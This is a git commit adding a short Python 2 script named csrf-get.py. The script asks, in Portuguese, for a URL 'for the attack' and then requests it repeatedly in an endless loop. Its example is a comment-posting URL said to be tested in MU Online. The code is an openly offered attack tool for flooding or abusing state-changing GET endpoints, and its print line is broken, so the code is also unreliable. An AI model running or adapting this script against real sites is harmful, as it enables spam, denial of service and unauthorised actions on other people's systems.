88f56c52c62a99041022ef3296d48634aecc8f87
Jonathan Silva <33843748+jonathansilva@users.noreply.github.com>
2019-05-21 23:58:05 -0300

    Create csrf-get.py

---
+++ csrf-get.py
@@ -0,0 +1,9 @@
+import urllib2
+'''
+Example: http://www.test.com/?pag=news&str=VIEW&id=ID-HERE&cmd=comment (Tested in MU Online)
+'''
+get_url = raw_input("Informe a url com os parametros para o ataque: ")
+count = 0
+while get_url:
+	count +=1
+	print (count, "Enviando requisicao..." % urllib2.urlopen(get_url))
